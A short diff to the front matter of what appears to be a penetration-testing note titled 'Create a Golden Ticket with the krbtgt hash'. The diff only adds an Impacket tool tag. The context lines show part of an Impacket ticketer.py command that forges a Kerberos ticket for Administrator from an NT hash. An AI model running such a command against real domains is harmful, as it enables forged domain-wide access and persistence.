@@ -35,6 +35,8 @@ output: 'root@kali:~# ticketer.py -nthash 7257228d1626640fb895708eb809c20e -doma
   [*] Saving ticket in Administrator.ccache'
 created_at: '2020-06-24T05:08:26.192120+00:00'
 updated_at: '2023-05-29T16:48:52.884824+00:00'
+tools:
+- '[[Impacket]]'
 ---
 
 # Create a Golden Ticket with the krbtgt hash
